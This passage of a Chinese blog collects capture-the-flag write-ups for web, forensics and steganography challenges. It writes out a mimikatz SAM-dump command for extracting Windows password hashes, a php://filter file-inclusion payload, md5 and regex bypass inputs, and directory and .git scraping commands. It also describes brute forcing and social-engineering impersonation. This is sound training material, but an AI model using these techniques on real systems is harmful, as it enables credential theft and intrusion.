<p><a target="_blank" rel="noopener" href="http://114.67.175.224:12873/admin.php">http://114.67.175.224:12873/admin.php</a></p>
<p><a target="_blank" rel="noopener" href="http://114.67.175.224:12873/db.sql">http://114.67.175.224:12873/db.sql</a></p>
<p>打开admin.php 的地址，发现管理员登陆界面</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105112255462.png" alt="image-20221105112255462"></p>
<p>打开db.sql，在里面找到账号密码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105113920309.png" alt="image-20221105113920309"></p>
<p>登录进去。然后我们在最开始的界面输入一个xss代码获取cookie</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105114120621.png" alt="image-20221105114120621"></p>
<p>在管理员界面得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105114211583.png" alt="image-20221105114211583"></p>
<p>%7B url编码为 {</p>
<p>%7D url编码为 }</p>
<p>最后得到flag：flag{7B57845943ba8c6225d2fbade764481e8d}</p>
<h2 id="18-抄错的字符"><a href="#18-抄错的字符" class="headerlink" title="18.抄错的字符"></a>18.抄错的字符</h2><p>老师让小明抄写一段话，结果粗心的小明把部分数字抄成了字母，还因为强迫症把所有字母都换成大写。你能帮小明恢复并解开答案吗：QWIHBLGZZXJSXZNVBZW</p>
<p>先将 QWIHBLGZZXJSXZNVBZW 转为数字与字母的组合</p>
<p>如果是抄错的，那么应该是把相似的给抄错了</p>
<p>1可能抄成 i 或 l </p>
<p>5可能抄成S</p>
<p>2可能抄成Z</p>
<p>9可能抄成g或q</p>
<p>······</p>
<p>因为有大小写数字有字母字符长度可能符合base64编码</p>
<p>因此用base64解码，在编码后缺一位，补上&#x3D;</p>
<p>使用各种组合进行解码，慢慢会解码得到一个最特殊的带有此题作者用户名的语句</p>
<p>QW1hbl92ZXJ5X2Nvb2w&#x3D;</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105123545529.png" alt="image-20221105123545529"></p>
<p>最终得到flag：flag{Aman_very_cool}</p>
<p>在线加解密工具：<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Category.php?Id=27">http://www.atoolbox.net/Category.php?Id=27</a></p>
<h2 id="19-简单取证1"><a href="#19-简单取证1" class="headerlink" title="19.简单取证1"></a>19.简单取证1</h2><p>这题目的大概就是想让我们知道怎么从 windows 的系统配置文件提取出账号密码</p>
<p>做题所用工具官方地址：https:&#x2F;&#x2F;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=github&spm=1001.2101.3001.7020">github</a>.com&#x2F;ParrotSec&#x2F;mimikatz<br>蓝奏云(2.2版本，自用)：<a target="_blank" rel="noopener" href="https://fictory.lanzouo.com/inMs1xk1pwb">https://fictory.lanzouo.com/inMs1xk1pwb</a></p>
<p>下载附件后解压，发现是一个 config 文件夹，该文件夹是存放 windows 用户名和明文密码等主要配置文件的，一般位于 windows 的 system32 文件夹中</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105203759344.png" alt="image-20221105203759344"></p>
<p>打开工具</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105204644868.png" alt="image-20221105204644868"></p>
<p>切换到解压后的配置文件 config 所在文件夹</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105204807229.png" alt="image-20221105204807229"></p>
<p>输入命令 <strong>lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</strong> 读取该该配置文件中储存的用户名和密码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105205032644.png" alt="image-20221105205032644"></p>
<p>往下拉可以看到用户名和密码已经提取出来了</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105205113323.png" alt="image-20221105205113323"></p>
<p>复制密码的 hash 值，放到 <a target="_blank" rel="noopener" href="http://md5.cn/">http://md5.cn/</a> 里破解，得到密码为 forensics</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105211325256.png" alt="image-20221105211325256"></p>
<p>最终得到 flag：flag{administrator-QQAAzz_forensics}</p>
<h2 id="20-隐写"><a href="#20-隐写" class="headerlink" title="20.隐写"></a>20.隐写</h2><p>隐写术就是将秘密信息隐藏到看上去普通的信息(如数字图像)中进行传送。<br>包括：图片隐写<br>            音频隐写<br>            视频隐写<br>            文本隐写</p>
<p>打开文件并解压</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105211748819.png" alt="image-20221105211748819"></p>
<p>用010 editor编辑器打开文件，看看文件头、文件尾有什么特殊的东西没有。文件头和文件尾都正常</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105214703350.png" alt="image-20221105214703350"></p>
<p>仔细观察010 editor编辑器下方输出位置，有报错。*ERROR: CRC Mismatch @ chunk[0]; in data: cbd6df8a; expected: c758d77d</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105220433495.png" alt="image-20221105220433495"></p>
<p>CRC报错一般有几种情况，一是确实是CRC被故意篡改了，可以用010改回去，修改之后打开图片没有发生变化</p>
<p>二是图片的高度或宽度被更改了，需要把高度、宽度改回去</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105221127389.png" alt="image-20221105221127389"></p>
<p>然后我们打开图片发现图片中的flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105221332045.png" alt="image-20221105221332045"></p>
<p>最终得到flag：BUGKU{a1e5aSA}</p>
<h2 id="21-telnet"><a href="#21-telnet" class="headerlink" title="21.telnet"></a>21.telnet</h2><p>下载解压文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106111503863.png" alt="image-20221106111503863"></p>
<p>用Wireshark打开networking文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106111721447.png" alt="image-20221106111721447"></p>
<p>题目是telnet，所以我们打开Telnet追踪流</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106112006716.png" alt="image-20221106112006716"></p>
<p>最终得到flag：flag{d316759c281bf925d600be698a4973d5}</p>
<h2 id="22-眼见非实"><a href="#22-眼见非实" class="headerlink" title="22.眼见非实"></a>22.眼见非实</h2><p>下载解压并打开文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106112315778.png" alt="image-20221106112315778"></p>
<p>这时我们怀疑是不是文件后缀错误</p>
<p>用010editor打开文件，发现开头是50 4b 03 04，这代表此文件是一个zip文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106121733366.png" alt="image-20221106121733366"></p>
<p>修改后缀并解压</p>
<p>得到一个文件夹</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106121932989.png" alt="image-20221106121932989"></p>
<p>打开文件夹，进入到Word文件下，发现一个document.xml文件，打开后查找关键字flag，找到flag</p>
<p><strong><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106122116876.png" alt="image-20221106122116876"></strong></p>
<p>最终得到flag：flag{F1@g}</p>
<h2 id="23-啊哒"><a href="#23-啊哒" class="headerlink" title="23.啊哒"></a>23.啊哒</h2><p>下载文件并解压</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106123458838.png" alt="image-20221106123458838"></p>
<p>打开文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106142958466.png" alt="image-20221106142958466"></p>
<p>用010editor打开没有发现异样</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106160846898.png" alt="image-20221106160846898"></p>
<p>然后我们查看文件属性，发现机型像一个16进制的数字</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106161105989.png" alt="image-20221106161105989"></p>
<p>用kali的binwalk工具对图片进行分析，看图片里是否有压缩文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106161145657.png" alt="image-20221106161145657"></p>
<p>使用binwalk命令果然发现有压缩文件，并且在桌面也出现了压缩文件</p>
<p><img src="https://img-blog.csdnimg.cn/20200216155112950.PNG" alt="img"></p>
<p>打开这个压缩文件发现了flag</p>
<p><img src="https://img-blog.csdnimg.cn/20200216155139794.PNG" alt="在这里插入图片描述"></p>
<p>可是打开flag.txt后发现是空的</p>
<p><img src="https://img-blog.csdnimg.cn/20200216155214319.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI0MDk4MQ==,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>打开35695.zip后发现文件是加密的</p>
<p><img src="https://img-blog.csdnimg.cn/20200216155340466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI0MDk4MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>之前那串16进制数73646E6973635F32303138，进入网站进行转换16进制转换ASCII编码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106162305816.png" alt="image-20221106162305816"></p>
<p>输入密码打开文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221106162348881.png" alt="image-20221106162348881"></p>
<p>最终得到flag：flag{3XiF_iNf0rM@ti0n}</p>
<h2 id="24-eval"><a href="#24-eval" class="headerlink" title="24.eval"></a>24.eval</h2><p>打开网页</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107092214311.png" alt="image-20221107092214311"></p>
<p>在URL上输入如下</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107092519710.png" alt="image-20221107092519710"></p>
<p>得到flag</p>
<h2 id="25-头等舱"><a href="#25-头等舱" class="headerlink" title="25.头等舱"></a>25.头等舱</h2><p>访问网址burpsuite抓包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107093143018.png" alt="image-20221107093143018"></p>
<h2 id="26-本地管理员"><a href="#26-本地管理员" class="headerlink" title="26.本地管理员"></a>26.本地管理员</h2><p>打开网页查看源代码发现源代码下有</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107094319091.png" alt="image-20221107094319091"></p>
<p>像base64编码，解码后得到test123</p>
<p>登录发现禁止本IP访问，用本地管理员</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107095500024.png" alt="image-20221107095500024"></p>
<p><img src="https://img-blog.csdnimg.cn/5f53a41fe1324b0f944c49557204af80.png" alt="img"></p>
<h2 id="27-bp"><a href="#27-bp" class="headerlink" title="27.bp"></a>27.bp</h2><p>打开网页</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107162810462.png" alt="image-20221107162810462"></p>
<p>burp抓包进行爆破（字典为text1000.txt）</p>
<p>返回长度一样</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107162908150.png" alt="image-20221107162908150"></p>
<p>通过观察响应包里面的内容，我们发现错误包里面都会返回一个JavaScript代码告知我们的密码有错误，所以我们通过Burpsuite的 （Grep – Match 在响应中找出存在指定的内容的一项。）过滤掉存在JavaScript代码中的{code: ‘bugku10000’}的数据包。</p>
<p><img src="https://img-blog.csdnimg.cn/595b350aacee44e192f509e805c15e7b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5piP5aS05bCP5p2o,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>点击Intruder中的选项找到Grep-Match（在响应中找出存在指定的内容的一项。）</p>
<p> 在输入框中我们输入{code: ‘bugku10000’}之后点击Add添加</p>
<p><img src="https://img-blog.csdnimg.cn/72ce83131e3c4da7831451bfe4b5902a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5piP5aS05bCP5p2o,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>发现密码为zxc123。在网站上进行登录 发现登录成功，并得到了flag</p>
<p><img src="https://img-blog.csdnimg.cn/28c5eb11687744ee9f58f629237026b9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5piP5aS05bCP5p2o,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/acc283b002e9482b883c4f3142769146.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5piP5aS05bCP5p2o,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>补充：使用{code&#x3D;”bugku1000”}不行的话可以使用“password error”</p>
<h2 id="28-社工-初步收集"><a href="#28-社工-初步收集" class="headerlink" title="28.社工-初步收集"></a>28.社工-初步收集</h2><p>御剑扫描网站</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107220553842.png" alt="image-20221107220553842"></p>
<p>打开网站</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107220619101.png" alt="image-20221107220619101"></p>
<p>抓包,f12试试运气，修改包绕过失败，爆破失败</p>
<p>下载附加文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107221058243.png" alt="image-20221107221058243"></p>
<p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107221137109.png" alt="image-20221107221137109"></p>
<p>登录一下试试</p>
<p><img src="https://img-blog.csdnimg.cn/2021050412561330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NzM2MzMy,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>wireshark抓包看看</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107223014765.png" alt="image-20221107223014765"></p>
<p>解码pass得到</p>
<p><img src="https://img-blog.csdnimg.cn/20210504130030781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NzM2MzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/202105041302318.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2021050413161599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NzM2MzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>用另一种登录方式，邮箱加授权码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107223336444.png" alt="image-20221107223336444"></p>
<p>找到了一定是有用的信息</p>
<p><img src="https://img-blog.csdnimg.cn/20210504132248673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NzM2MzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>这个应该是在暗示网站账号名字和密码了，<br>直接就是说爆破，社工字典<br>他说已经20 了，那么他应该是2001年出生的，“前两天”那生日无非就是2月6日，根据中国人的传统补全0，那么就是20010206的生日，姓名就是mara<img src="https://img-blog.csdnimg.cn/20210504132741555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NzM2MzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>生成字典，再用burp爆破</p>
<p><img src="https://img-blog.csdnimg.cn/20210504133041406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NzM2MzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>登录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107224239495.png" alt="image-20221107224239495"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221107224334659.png" alt="image-20221107224334659"></p>
<p>得到flag</p>
<h2 id="29-社工-伪造"><a href="#29-社工-伪造" class="headerlink" title="29.社工-伪造"></a>29.社工-伪造</h2><p>进入网站随便输入一个号进入</p>
<p>给小美发消息，发送flag，回复不给flag</p>
<p>我们伪造成他男朋友，修改头像和id</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108182413243.png" alt="image-20221108182413243"></p>
<h2 id="30-game1"><a href="#30-game1" class="headerlink" title="30.game1"></a>30.game1</h2><p>游戏类的，一般都是当分数高到一定程度时，就可以过关</p>
<p>bp抓包</p>
<p>在游戏失败后会发送一个包，修改包试试</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108183658366.png" alt="image-20221108183658366"></p>
<p>失败了，看看包里是否还有其他的值产生影响（多次玩游戏，看看数据包里有哪些值发生变化</p>
<p>很明显，当分数不同时不同的包差距在于 score和 sign</p>
<p>对比sign发现 sign是由 zM   &#x3D;&#x3D; 构成，去解码（删掉前面的ZM和后面的&#x3D;&#x3D;）</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108184909652.png" alt="image-20221108184909652"></p>
<p>然后改数据包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108185109511.png" alt="image-20221108185109511"></p>
<h2 id="31-变量1"><a href="#31-变量1" class="headerlink" title="31.变量1"></a>31.变量1</h2><p>php有个变量 ，叫做GLOBALS， 全局变量，可以试试通过var_dump输出看看</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108190048813.png" alt="image-20221108190048813"></p>
<h2 id="32-source"><a href="#32-source" class="headerlink" title="32.source"></a>32.source</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108190231235.png" alt="image-20221108190231235"></p>
<p>假的flag</p>
<p>题目提示用kali，直接打开kali扫描，用gropher 扫描</p>
<p>gobuster dir -u <a target="_blank" rel="noopener" href="http://114.67.246.176:10491/">http://114.67.246.176:10491/</a> -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</p>
<p><img src="https://img-blog.csdnimg.cn/db57f80432e7456cb00702f6a03bb4c4.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMjgzMTg3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>用wget命令来下载</p>
<p>wget -r <a target="_blank" rel="noopener" href="http://114.67.246.176:14508/.git">http://114.67.246.176:14508/.git</a></p>
<p><img src="https://img-blog.csdnimg.cn/73b72fdeb3aa49c2b6b2a40d90b50c0c.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMjgzMTg3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>查看日志      日志记录了文件的更新和提交</p>
<p><img src="https://img-blog.csdnimg.cn/4a7a0bd3f806438e9d4ec6b4fe9f072f.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMjgzMTg3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>一个个文件去查看</p>
<p>在git show 40c6d51找到flag</p>
<p><img src="https://img-blog.csdnimg.cn/82a92915df914f16abb8b90de2213043.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMjgzMTg3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="33-源代码"><a href="#33-源代码" class="headerlink" title="33.源代码"></a>33.源代码</h2><p>查看源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108200630440.png" alt="image-20221108200630440"></p>
<p>使用unescape解码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108201019866.png" alt="image-20221108201019866">通过分析源码可以知道输入框中传递参数67d709b2b54aa2aa648cf6e87a7114f1可以得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108200937257.png" alt="image-20221108200937257"></p>
<h2 id="34-文件包含"><a href="#34-文件包含" class="headerlink" title="34.文件包含"></a>34.文件包含</h2><p>这一题用到php伪协议的方式</p>
<p>php:&#x2F;&#x2F;filter可以获取指定文件源码</p>
<p>当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</p>
<p>大多数时候很多信息无法直接显示在浏览器页面上，所以需要将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
<p>将得到的内容进行base64解码得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108202002177.png" alt="image-20221108202002177"></p>
<h2 id="35-好像需要密码"><a href="#35-好像需要密码" class="headerlink" title="35.好像需要密码"></a>35.好像需要密码</h2><p>打开网页，爆破密码，得到密码12468</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108214534313.png" alt="image-20221108214534313"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108214546358.png" alt="image-20221108214546358"></p>
<h2 id="36-备份是个好习惯"><a href="#36-备份是个好习惯" class="headerlink" title="36.备份是个好习惯"></a>36.备份是个好习惯</h2><p>打开网页</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108214918597.png" alt="image-20221108214918597">没有任何信息</p>
<p>扫描地址</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9ac373b7bab794bbe8c4b6f4bf7d8bf5.png" alt="image-20210623155152435"></p>
<p>找到一个备份文件</p>
<p>访问备份的链接，获取到备份文件</p>
<p>打开备份文件，发现是一个PHP代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上段代码的意思是需要两个不同的key不同，但是两个key的md5的值是相同的</p>
<p>使用kekeyy数组进行绕过，md5函数无法处理数组，这样就会返回两个NULL，而两个NULL的md5值是一样的，但是传入的key值可以不同</p>
<p>因为代码中$str &#x3D; str_replace(‘key’,’’,$str);过滤了一次key,我们需要重新构造一个变量名使得在过滤完一次后的结果为key，使用kekeyy数组进行绕过</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108220522968.png" alt="image-20221108220522968"></p>
<h2 id="37-No-one-knows-regex-better-than-me"><a href="#37-No-one-knows-regex-better-than-me" class="headerlink" title="37.No one knows regex better than me"></a>37.No one knows regex better than me</h2><p>打开网页，分析代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108221425180.png" alt="image-20221108221425180"></p>
<p>接收两个参数 $zero $first</p>
<p>影响三个参数 key&#x3D;second&#x3D;zero.first      third&#x3D;first</p>
<p>条件分支由外到内，进行绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class="variable">$second</span>);</span><br><span class="line">Yeedo|wants|a|girl|friend|<span class="keyword">or</span>|a|flag</span><br></pre></td></tr></table></figure>

<p>继续绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.\.|flag/&quot;</span>,<span class="variable">$key</span>)</span><br></pre></td></tr></table></figure>

<p>继续绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>);</span><br></pre></td></tr></table></figure>

<p>注: \056\160\150\x70为16进制和8进制ascii代码，php可自动识别</p>
<p>最终payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zero=ZmxhZw==&amp;first=oror|.php</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221108222621942.png" alt="image-20221108222621942"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">补充：$zero为base64(‘flag’)</span><br><span class="line">	第三次匹配字符为|.php</span><br></pre></td></tr></table></figure>

<p>关于进制代码</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c67967c1cf8e365754ce284af7cebab2.gif" alt="asciifull"></p>
<h2 id="38-cookies"><a href="#38-cookies" class="headerlink" title="38.cookies"></a>38.cookies</h2><p>抓包看看</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109114851471.png" alt="image-20221109114851471"></p>
<p>发现访问的是一个keys.txt文件</p>
<p> 尝试用 filename访问index.php（原url使用base64，这也将index.php进行编码），line参数应该是行数，试一下 line&#x3D;2</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221109115718524.png" alt="image-20221109115718524"></p>
<p>出现一行代码，试一下line&#x3D;3显示了不同的代码</p>
<p>将源码读取出来</p>
